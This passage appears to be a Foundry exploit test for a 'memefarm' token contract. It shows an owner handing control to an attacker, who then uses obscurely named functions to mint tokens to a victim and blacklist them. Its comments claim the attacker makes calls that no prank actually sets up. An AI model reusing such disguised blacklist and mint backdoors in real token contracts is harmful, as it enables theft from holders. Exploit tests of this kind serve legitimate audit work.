                // Precondition check: Victim has no balance initially
                assertEq(target.balanceOf(victim), 0, "Victim should not have tokens initially");

                // Precondition check: Victim is not blacklisted yet
                assertEq(target._________(victim), false, "Victim should not be blacklisted initially");
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Cast TARGET to the contract interface
                memefarm target = memefarm(TARGET);

                // 1. As the owner, set the marketing wallet to the attacker's address
                vm.startPrank(owner);
                target.setMarketinWalleAddress(attacker);
                vm.stopPrank();

                // 2. As the new marketing wallet, mint tokens to the victim to satisfy the non-zero balance precondition.
                target.changeRouterVeslon(victim);
                assertGt(target.balanceOf(victim), 0, "Failed to mint tokens for victim");

                // 3. As the new marketing wallet (attacker), blacklist the victim
                target.qwidji(victim, true);

                // 4. Oracle check: Verify the victim is now blacklisted
                assertEq(target._________(victim), true, "Exploit failed: Victim was not blacklisted");
    }



    // --- Receive ETH ─────────────────────────────────────────
    receive() external payable {}
